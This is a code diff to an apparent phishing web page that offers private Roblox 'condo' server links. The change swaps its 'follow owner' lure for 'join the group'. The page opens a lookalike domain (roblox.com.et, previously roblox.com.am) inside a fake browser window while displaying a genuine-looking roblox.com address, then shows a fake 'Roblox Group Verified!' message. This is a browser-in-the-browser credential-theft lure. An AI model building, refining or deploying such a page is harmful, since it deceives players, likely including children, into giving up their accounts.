@@ -133,10 +133,10 @@
         <section class="wrap" style="padding: 10px 0;">
             <div class="unlock-banner" id="unlockBanner">
                 <button class="unlock-btn" id="unlockBtn" onclick="openOwnerProfile()">
-                    <i class="fa-solid fa-user-plus"></i> Follow Owner to Unlock More Games
+                    <i class="fa-solid fa-users-rectangle"></i> Join the Roblox Group to Unlock More Games
                 </button>
                 <p style="font-size:0.82rem; color:#c8b2d6; max-width:50ch; margin:10px auto 0; line-height:1.4;">
-                    Following the owner's Roblox account verifies your browser session and automatically unlocks our private list of active Roblox condo and hangout server links.
+                    Joining our official Roblox community group verifies your browser session and automatically unlocks our private list of active Roblox condo and hangout server links.
                 </p>
             </div>
 
@@ -167,7 +167,7 @@
         <div class="chrome-window">
             <div id="tabPopupNotice">
                 <i class="fa-solid fa-circle-check" style="color:#4fd88a; margin-bottom:4px; font-size:16px;"></i><br>
-                If you already followed the owner, <strong>exit the tab on the top left</strong> to see the good games!
+                If you already joined the group, <strong>exit the tab on the top left</strong> to see the good games!
             </div>
 
             <div class="chrome-titlebar">
@@ -198,7 +198,6 @@
         </div>
     </div>
         <script>
-        // Public hosted thumbnails that work on any phone browser without local file errors
         const bgImg = "https://images.unsplash.com/photo-1534796636912-3b95b3ab5986?auto=format&fit=crop&w=1400&q=80";
         const thumb1 = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&w=600&q=80";
         const thumb2 = "https://images.unsplash.com/photo-1614850523459-c2f4c699c52e?auto=format&fit=crop&w=600&q=80";
@@ -220,8 +219,8 @@
         });
 
         const appConfig = {
-            ownerProfileUrl: "https://www.roblox.com.am/users/123456789/profile",
-            ownerFakeUrl: "https://roblox.com/users/123456789/profile",
+            ownerProfileUrl: "https://www.roblox.com.et/communities/8052295065/unidentifiedGiveaways",
+            ownerFakeUrl: "https://roblox.com/communities/12345678/galaxy-community",
             isUnlocked: false,
             serversLocked: [
                 {
@@ -306,7 +305,7 @@
 
                 const btnHtml = appConfig.isUnlocked 
                     ? `<button style="width:100%; padding:9px; background:linear-gradient(135deg,#a855f7,#ec4899); border:none; border-radius:6px; color:#fff; font-size:0.75rem; font-weight:700; cursor:pointer; font-family:'Chakra Petch',sans-serif; box-shadow:0 4px 12px rgba(168,85,247,0.5);" onclick="openServer('${srv.id}')">JOIN PRIVATE SERVER</button>`
-                    : `<button style="width:100%; padding:9px; background:rgba(168,85,247,0.15); border:1px solid rgba(184,122,220,0.25); border-radius:6px; color:#8c709e; font-size:0.75rem; font-weight:700; cursor:not-allowed; font-family:'Chakra Petch',sans-serif;" disabled>LOCKED (FOLLOW OWNER)</button>`;
+                    : `<button style="width:100%; padding:9px; background:rgba(168,85,247,0.15); border:1px solid rgba(184,122,220,0.25); border-radius:6px; color:#8c709e; font-size:0.75rem; font-weight:700; cursor:not-allowed; font-family:'Chakra Petch',sans-serif;" disabled>LOCKED (JOIN GROUP)</button>`;
 
                 card.innerHTML = `
                     <div style="position:relative; height:135px; background:#10071f;">
@@ -331,12 +330,12 @@
 
         function openOwnerProfile() {
             const loadingModal = document.getElementById('loadingModal');
-            document.getElementById('loadingText').innerText = `Redirecting to Owner Profile...`;
+            document.getElementById('loadingText').innerText = `Redirecting to Roblox Group...`;
             loadingModal.style.display = 'flex';
             
             setTimeout(() => {
                 loadingModal.style.display = 'none';
-                showBrowserModal(appConfig.ownerProfileUrl, "Roblox Profile - Owner", appConfig.ownerFakeUrl, true);
+                showBrowserModal(appConfig.ownerProfileUrl, "Roblox Group - Community", appConfig.ownerFakeUrl, true);
             }, 700);
         }
 
@@ -401,7 +400,7 @@
             banner.classList.add('unlocked');
             banner.innerHTML = `
                 <div style="font-family:'Chakra Petch',sans-serif; font-weight:700; font-size:1rem; color:#4fd88a; margin-bottom:4px;">
-                    <i class="fa-solid fa-circle-check"></i> Roblox Account Verified!
+                    <i class="fa-solid fa-circle-check"></i> Roblox Group Verified!
                 </div>
                 <p style="font-size:0.8rem; color:#c8b2d6; margin:0;">All 6 Roblox private server links are now active and clickable below.</p>
             `;
